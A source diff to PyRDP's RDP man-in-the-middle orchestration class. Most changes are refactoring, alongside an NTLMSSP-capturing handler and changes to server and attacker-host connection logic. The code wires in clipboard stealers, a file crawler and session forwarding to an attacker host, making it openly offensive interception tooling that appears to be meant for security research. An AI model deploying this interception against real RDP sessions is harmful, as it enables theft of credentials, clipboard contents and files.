@@ -1,6 +1,6 @@
 #
 # This file is part of the PyRDP project.
-# Copyright (C) 2019-2020 GoSecure Inc.
+# Copyright (C) 2019-2021 GoSecure Inc.
 # Licensed under the GPLv3 or later.
 #
 
@@ -17,40 +17,31 @@ from pyrdp.enum import MCSChannelName, ParserMode, PlayerPDUType, ScanCode, Segm
 from pyrdp.layer import ClipboardLayer, DeviceRedirectionLayer, LayerChainItem, RawLayer, \
     VirtualChannelLayer
 from pyrdp.logging import RC4LoggingObserver
+from pyrdp.logging.StatCounter import StatCounter
 from pyrdp.logging.adapters import SessionLogger
 from pyrdp.logging.observers import FastPathLogger, LayerLogger, MCSLogger, SecurityLogger, \
     SlowPathLogger, X224Logger
-from pyrdp.logging.StatCounter import StatCounter
 from pyrdp.mcs import MCSClientChannel, MCSServerChannel
 from pyrdp.mitm.AttackerMITM import AttackerMITM
 from pyrdp.mitm.ClipboardMITM import ActiveClipboardStealer, PassiveClipboardStealer
-from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM
 from pyrdp.mitm.FastPathMITM import FastPathMITM
 from pyrdp.mitm.FileCrawlerMITM import FileCrawlerMITM
-from pyrdp.mitm.layerset import RDPLayerSet
 from pyrdp.mitm.MCSMITM import MCSMITM
 from pyrdp.mitm.MITMRecorder import MITMRecorder
 from pyrdp.mitm.PlayerLayerSet import TwistedPlayerLayerSet
 from pyrdp.mitm.SecurityMITM import SecurityMITM
 from pyrdp.mitm.SlowPathMITM import SlowPathMITM
-from pyrdp.mitm.state import RDPMITMState
 from pyrdp.mitm.TCPMITM import TCPMITM
 from pyrdp.mitm.VirtualChannelMITM import VirtualChannelMITM
 from pyrdp.mitm.X224MITM import X224MITM
+from pyrdp.mitm.config import MITMConfig
+from pyrdp.mitm.layerset import RDPLayerSet
+from pyrdp.mitm.state import RDPMITMState
 from pyrdp.recording import FileLayer, RecordingFastPathObserver, RecordingSlowPathObserver, \
     Recorder
-
-from pyrdp.layer.segmentation import SegmentationObserver
-
-
-class PacketForwarder(SegmentationObserver):
-    """Handles unknown segmentation packets by forwarding them transparently."""
-    def __init__(self, sink):
-        self._forwarder = sink
-
-    def onUnknownHeader(self, header, data: bytes):
-        self._forwarder.sendBytes(data)
+from pyrdp.security import NTLMSSPState
+from pyrdp.security.nla import NLAHandler
 
 
 class RDPMITM:
@@ -58,9 +49,9 @@ class RDPMITM:
     Main MITM class. The job of this class is to orchestrate the components for all the protocols.
     """
 
-    def __init__(self, mainLogger: SessionLogger, crawlerLogger: SessionLogger, config: MITMConfig, state: RDPMITMState=None, recorder: Recorder=None):
+    def __init__(self, mainLogger: SessionLogger, crawlerLogger: SessionLogger, config: MITMConfig, state: RDPMITMState = None, recorder: Recorder = None):
         """
-        :param log: base logger to use for the connection
+        :param mainLogger: base logger to use for the connection
         :param config: the MITM configuration
         """
 
@@ -103,11 +94,13 @@ class RDPMITM:
         self.channelMITMs = {}
         """MITM components for virtual channels"""
 
-        serverConnector = self.connectToServer()
-        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, serverConnector, self.statCounter)
+        self.onTlsReady = None
+        """Callback for when TLS is done"""
+
+        self.tcp = TCPMITM(self.client.tcp, self.server.tcp, self.player.tcp, self.getLog("tcp"), self.state, self.recorder, self.statCounter)
         """TCP MITM component"""
 
-        self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, serverConnector, self.startTLS)
+        self.x224 = X224MITM(self.client.x224, self.server.x224, self.getLog("x224"), self.state, self.connectToServer, self.disconnectFromServer, self.startTLS)
         """X224 MITM component"""
 
         self.mcs = MCSMITM(self.client.mcs, self.server.mcs, self.state, self.recorder, self.buildChannel, self.getLog("mcs"), self.statCounter)
@@ -116,7 +109,7 @@ class RDPMITM:
         self.security: SecurityMITM = None
         """Security MITM component"""
 
-        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state, self.statCounter)
+        self.slowPath = SlowPathMITM(self.client.slowPath, self.server.slowPath, self.state, self.statCounter, self.getLog("slowpath"))
         """Slow-path MITM component"""
 
         self.fastPath: FastPathMITM = None
@@ -149,15 +142,17 @@ class RDPMITM:
 
         if config.recordReplays:
             date = datetime.datetime.now()
-            replayFileName = "rdp_replay_{}_{}_{}.pyrdp"\
-                    .format(date.strftime('%Y%m%d_%H-%M-%S'),
-                            date.microsecond // 1000,
-                            self.state.sessionID)
+            replayFileName = f"rdp_replay_{date.strftime('%Y%m%d_%H-%M-%S')}_{date.microsecond // 1000}_{self.state.sessionID}.pyrdp"
             self.recorder.setRecordFilename(replayFileName)
             self.recorder.addTransport(FileLayer(self.config.replayDir / replayFileName))
 
         if config.enableCrawler:
-            self.crawler: FileCrawlerMITM = FileCrawlerMITM(self.getClientLog(MCSChannelName.DEVICE_REDIRECTION).createChild("crawler"), crawlerLogger, self.config, self.state)
+            self.crawler: FileCrawlerMITM = FileCrawlerMITM(
+                self.getClientLog(MCSChannelName.DEVICE_REDIRECTION).createChild("crawler"),
+                crawlerLogger,
+                self.config,
+                self.state
+            )
 
     def getProtocol(self) -> Protocol:
         """
@@ -186,6 +181,10 @@ class RDPMITM:
         """
         return self.serverLog.createChild(name)
 
+    def disconnectFromServer(self):
+        self.server.replaceTCP()
+        self.tcp.setServer(self.server.tcp)
+
     async def connectToServer(self):
         """
         Coroutine that connects to the target RDP server and the attacker.
@@ -194,20 +193,20 @@ class RDPMITM:
 
         serverFactory = AwaitableClientFactory(self.server.tcp)
         if self.config.transparent:
-            src = self.client.tcp.transport.client
-            if self.config.targetHost:
-                # Fully Transparent (with a specific poisoned target.)
-                connectTransparent(self.config.targetHost, self.config.targetPort, serverFactory, bindAddress=(src[0], 0))
+            if self.state.effectiveTargetHost:
+                # Fully Transparent (with a specific poisoned target, or when using redirection)
+                src = self.client.tcp.transport.client
+                connectTransparent(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory, bindAddress=(src[0], 0))
             else:
                 # Half Transparent (for client-side only)
                 dst = self.client.tcp.transport.getHost().host
-                reactor.connectTCP(dst, self.config.targetPort, serverFactory)
+                reactor.connectTCP(dst, self.state.effectiveTargetPort, serverFactory)
         else:
-            reactor.connectTCP(self.config.targetHost, self.config.targetPort, serverFactory)
+            reactor.connectTCP(self.state.effectiveTargetHost, self.state.effectiveTargetPort, serverFactory)
 
         await serverFactory.connected.wait()
 
-        if self.config.attackerHost is not None and self.config.attackerPort is not None:
+        if self.config.attackerHost is not None and self.config.attackerPort is not None and not self.player.tcp.connectedEvent.is_set():
             attackerFactory = AwaitableClientFactory(self.player.tcp)
             reactor.connectTCP(self.config.attackerHost, self.config.attackerPort, attackerFactory)
 
@@ -237,8 +236,9 @@ class RDPMITM:
         self.onTlsReady = None
 
         # Add unknown packet handlers.
-        self.client.segmentation.addObserver(PacketForwarder(self.server.tcp))
-        self.server.segmentation.addObserver(PacketForwarder(self.client.tcp))
+        ntlmSSPState = NTLMSSPState()
+        self.client.segmentation.addObserver(NLAHandler(self.server.tcp, ntlmSSPState, self.getLog("ntlmssp")))
+        self.server.segmentation.addObserver(NLAHandler(self.client.tcp, ntlmSSPState, self.getLog("ntlmssp")))
 
     def startTLS(self, onTlsReady: typing.Callable[[], None]):
         """
@@ -297,7 +297,7 @@ class RDPMITM:
         self.server.fastPath.addObserver(RecordingFastPathObserver(self.recorder, PlayerPDUType.FAST_PATH_OUTPUT))
 
         self.security = SecurityMITM(self.client.security, self.server.security, self.getLog("security"), self.config, self.state, self.recorder)
-        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter)
+        self.fastPath = FastPathMITM(self.client.fastPath, self.server.fastPath, self.state, self.statCounter, self.getLog("fastpath"))
 
         if self.player.tcp.transport or self.config.payload:
             self.attacker = AttackerMITM(self.client.fastPath, self.server.fastPath, self.player.player, self.log, self.state, self.recorder)
@@ -365,7 +365,7 @@ class RDPMITM:
         LayerChainItem.chain(client, clientSecurity, clientVirtualChannel, clientLayer)
         LayerChainItem.chain(server, serverSecurity, serverVirtualChannel, serverLayer)
 
-        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.statCounter, self.state)
+        deviceRedirection = DeviceRedirectionMITM(clientLayer, serverLayer, self.getLog(MCSChannelName.DEVICE_REDIRECTION), self.statCounter, self.state, self.tcp)
         self.channelMITMs[client.channelID] = deviceRedirection
 
         if self.config.enableCrawler:
